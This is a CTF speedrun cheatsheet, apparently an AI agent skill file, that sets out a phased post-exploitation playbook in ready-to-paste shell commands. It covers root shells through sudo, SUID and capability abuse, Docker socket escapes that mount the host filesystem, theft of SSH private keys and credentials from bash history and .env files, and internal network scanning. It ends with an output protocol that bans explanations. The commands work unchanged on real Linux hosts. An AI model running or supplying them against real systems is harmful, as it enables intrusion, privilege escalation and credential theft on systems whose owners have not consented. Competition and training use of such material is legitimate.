# CTF Web → Flag Hunt Cheatsheet (Speedrun Mode)

## 🎯 CRITICAL WORKFLOW

```
Web Exploit (SQLi/XSS/SSTI/RCE)
  ↓
Gain Webshell/Command Execution
  ↓
PHASE 1: FLAG HUNT (Current Permissions) ← START HERE
  ↓
Permission Denied?
  ↓ YES
PHASE 2: PRIVILEGE ESCALATION
  ↓
PHASE 3: FLAG HUNT (Elevated Permissions)
  ↓
Still No Flag?
  ↓
PHASE 4: LATERAL MOVEMENT / PIVOTING
```

---

## 📋 PHASE 1: Immediate Flag Hunt (Current User)

### Quick Wins (30 seconds)
```bash
# Common locations (try first)
cat /flag.txt /flag /root/flag.txt /home/*/flag.txt /var/www/html/flag.txt /app/flag.txt 2>/dev/null

# Environment variables
env | grep -iE "(flag|coc2026|secret|key)"
cat /proc/self/environ | tr '\0' '\n' | grep -iE "flag"
cat /proc/1/environ | tr '\0' '\n' | grep -iE "flag"

# Process command lines
ps aux | grep -iE "flag"
cat /proc/*/cmdline 2>/dev/null | tr '\0' '\n' | grep -iE "flag"
```

### Filesystem Search (1 minute)
```bash
# Find files with "flag" in name
find / -name "*flag*" -type f 2>/dev/null | head -20
find /home -name "*flag*" 2>/dev/null
find /var/www -name "*flag*" 2>/dev/null
find /tmp -name "*flag*" 2>/dev/null
find /opt -name "*flag*" 2>/dev/null
find /app -name "*flag*" 2>/dev/null

# Find readable files (current user)
find /home -type f -readable 2>/dev/null | grep -iE "flag"
find /var/www -type f -readable 2>/dev/null | grep -iE "flag"
```

### Content Search (2 minutes)
```bash
# Grep for flag patterns
grep -r "flag{" /var/www 2>/dev/null | head -10
grep -r "coc2026{" /var/www 2>/dev/null | head -10
grep -r "flag{" /home 2>/dev/null | head -10
grep -r "coc2026{" /tmp 2>/dev/null | head -10
grep -r "flag{" /opt 2>/dev/null | head -10

# Config files
cat /var/www/html/config.php 2>/dev/null | grep -iE "flag"
cat /var/www/html/.env 2>/dev/null | grep -iE "flag"
cat /app/.env 2>/dev/null | grep -iE "flag"
cat /etc/environment 2>/dev/null | grep -iE "flag"
```

### Database Quick Check
```bash
# MySQL
mysql -e "SHOW DATABASES;" 2>/dev/null
mysql -e "SELECT * FROM ctf.flags;" 2>/dev/null
mysql -e "SELECT * FROM challenge.flag;" 2>/dev/null

# SQLite
find / -name "*.db" -type f 2>/dev/null | head -10
sqlite3 /var/www/*.db "SELECT * FROM flags;" 2>/dev/null
sqlite3 /app/*.db "SELECT * FROM flags;" 2>/dev/null

# PostgreSQL
psql -c "\l" 2>/dev/null
psql -d ctf -c "SELECT * FROM flags;" 2>/dev/null
```

### Web Application Specific
```bash
# PHP applications
cat /var/www/html/index.php | grep -iE "flag"
cat /var/www/html/admin.php | grep -iE "flag"
find /var/www -name "*.php" -exec grep -l "flag" {} \; 2>/dev/null

# Node.js applications
cat /app/server.js | grep -iE "flag"
cat /app/config.js | grep -iE "flag"
cat /app/.env | grep -iE "flag"

# Python applications
cat /app/app.py | grep -iE "flag"
cat /app/config.py | grep -iE "flag"
cat /app/settings.py | grep -iE "flag"
```

---

## 🔓 PHASE 2: Privilege Escalation (If Permission Denied)

### Triage (30 seconds)
```bash
# Verify current user
id
whoami
groups

# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check capabilities
getcap -r / 2>/dev/null

# Check cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
```

### Quick Wins (GTFOBins)
```bash
# Sudo abuse (if sudo -l shows anything)
# Example: sudo vim → :!/bin/bash
# Example: sudo find . -exec /bin/bash \;
# Example: sudo awk 'BEGIN {system("/bin/bash")}'

# SUID abuse
# Example: /usr/bin/find . -exec /bin/bash -p \;
# Example: /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Capabilities abuse
# Example: /usr/bin/python3 = cap_setuid+ep
# python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### Docker/Container Escape
```bash
# Check if in container
cat /proc/1/cgroup | grep -iE "docker|lxc"

# Docker socket escape
ls -la /var/run/docker.sock
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Docker group abuse
id | grep docker
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## 🔄 PHASE 3: Post-Privesc Flag Hunt

### Re-run Phase 1 with Root
```bash
# Now with elevated privileges
find / -name "*flag*" -type f 2>/dev/null
cat /root/flag.txt
cat /flag.txt
grep -r "coc2026{" / 2>/dev/null | head -10

# Check root's environment
cat /root/.bashrc | grep -iE "flag"
cat /root/.bash_history | grep -iE "flag"
env | grep -iE "flag"
```

---

## 🌐 PHASE 4: Lateral Movement (If Still No Flag)

### Credential Harvesting
```bash
# Bash history
cat /home/*/.bash_history | grep -iE "(pass|key|token|flag)"
cat /root/.bash_history | grep -iE "(pass|key|token|flag)"

# Config files
cat /var/www/html/config.php | grep -iE "(pass|user|db)"
cat /app/.env | grep -iE "(pass|user|db|secret)"
cat /etc/environment | grep -iE "(pass|key|token)"

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null

# Database credentials
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/config.inc.php 2>/dev/null
```

### Network Reconnaissance
```bash
# Check network interfaces
ip a
ifconfig

# Check listening services
netstat -tulpn
ss -tulpn

# Scan internal network — host discovery
nmap -sn 10.0.0.0/24

# Full port scan on target (masscan → nmap two-step)
sudo masscan 127.0.0.1 -p 0-65535 --rate=10000 -oG /tmp/mscan.txt 2>/dev/null
PORTS=$(grep "open" /tmp/mscan.txt | awk '{print $4}' | cut -d/ -f1 | tr '\n' ',' | sed 's/,$//'); nmap -sV -p "$PORTS" 127.0.0.1
```

### Invoke Advanced Skills
```bash
# For OS-level exploitation
# Invoke: /ctf-os-exploit

# For network pivoting
# Invoke: /ctf-forensics (if PCAP needed)
```

---

## 🚨 FLAG OUTPUT PROTOCOL

### When Flag Found
**HALT immediately. Output EXACTLY 3 lines:**

```
[FLAG] **coc2026{example_flag_here}**
[CLEAN] **coc2026{example_flag_here}**
[METHOD] grep -r "coc2026{" /var/www 2>/dev/null
```

**DO NOT:**
- Add explanations
- Add summaries
- Add congratulations
- Continue searching

---

## 🛡️ Anti-Trap Guardrails

### Timeout Protection
```bash
# All commands with timeout
timeout 5 find / -name "*flag*" 2>/dev/null
timeout 5 grep -r "flag{" /var/www 2>/dev/null
```

### Bailout Strategy
```
Same error 3 times?
  ↓
PIVOT to different approach:
- find fails → use locate
- grep fails → use strings
- cat fails → use head/tail
```

### Memory Protection
```bash
# Never read huge files directly
# Use head/tail/grep instead
head -100 /var/log/apache2/access.log | grep -iE "flag"
tail -100 /var/log/nginx/access.log | grep -iE "flag"
```

---

## 📊 Common Flag Locations (Priority Order)

1. **Root directory:** `/flag.txt`, `/flag`
2. **Home directories:** `/home/*/flag.txt`, `/root/flag.txt`
3. **Web root:** `/var/www/html/flag.txt`, `/var/www/flag.txt`
4. **Application directory:** `/app/flag.txt`, `/opt/flag.txt`
5. **Temp directories:** `/tmp/flag.txt`, `/var/tmp/flag.txt`
6. **Environment variables:** `env`, `/proc/self/environ`
7. **Process cmdline:** `/proc/*/cmdline`
8. **Database:** MySQL/PostgreSQL/SQLite tables named `flags`
9. **Config files:** `.env`, `config.php`, `settings.py`
10. **Hidden files:** `.flag`, `.secret`, `._flag`

---

## 🎯 Hunt Regex (Global Monitor)

```regex
/(?:coc2026|flag|f1a9|fl4g)\{.*?\}|\{[a-fA-F0-9]{32}\}|\b[a-fA-F0-9]{32}\b/i
```

**Matches:**
- `coc2026{...}`
- `flag{...}`
- `f1a9{...}`
- `fl4g{...}`
- `{32-char hex}`
- `32-char hex standalone`

---

## ⚡ Speed Commands (Copy-Paste Ready)

### One-Liner Flag Hunt
```bash
cat /flag.txt /flag /root/flag.txt /home/*/flag.txt /var/www/html/flag.txt /app/flag.txt 2>/dev/null || find / -name "*flag*" -type f 2>/dev/null | head -20 | xargs cat 2>/dev/null || grep -r "coc2026{" /var/www /home /tmp /opt 2>/dev/null | head -5
```

### One-Liner Privesc Triage
```bash
id; sudo -l; find / -perm -4000 -type f 2>/dev/null | head -10; getcap -r / 2>/dev/null; cat /etc/crontab
```

### One-Liner Credential Harvest
```bash
cat /home/*/.bash_history /root/.bash_history /var/www/html/config.php /app/.env 2>/dev/null | grep -iE "(pass|key|token|flag)" | head -20
```

---

**Competition Mode:** Execute Phase 1 → Phase 2 → Phase 3 → Phase 4 in strict order. HALT on flag match.
